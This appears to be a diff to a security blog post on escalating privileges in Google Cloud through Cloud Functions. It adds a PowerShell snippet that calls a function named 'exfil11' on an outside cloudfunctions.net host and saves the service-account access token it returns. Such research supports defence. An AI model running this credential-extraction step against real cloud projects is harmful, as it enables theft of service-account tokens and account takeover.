@@ -15,8 +15,7 @@
 - [Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform](#phase-iii---privilege-escalating-via-cloud-function-in-google-cloud-platform)
   - [Deploying the Cloud Function (via Cloud Function API - gRPC)](#deploying-the-cloud-function-via-cloud-function-api---grpc)
   - [Setting IAM Policy Binding to the Cloud Function (via Cloud Function API - gRPC)](#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api---grpc)
-  - [Invoking the Cloud Function](#)
-  - [Escalating Privilege to a high level Service Account](#)
+  - [Escalating Privilege to a high level Service Account](#escalating-privilege-to-a-high-level-service-account)
 
 <br>
 
@@ -578,3 +577,12 @@ These are the permissions required for the overall task:
 <p>
   <img src="https://github.com/anrbn/blog/blob/main/images/16.png">
 </p>
+
+### Escalating Privilege to a High Level Service Account
+
+```powershell
+$response = Invoke-WebRequest -Uri "https://us-east1-nnnn-374620.cloudfunctions.net/exfil11" -UseBasicParsing
+$jsonResponse = $response | ConvertFrom-Json
+$accessToken = $jsonResponse.access_token
+$accessToken | Out-File -FilePath "code.txt"
+```
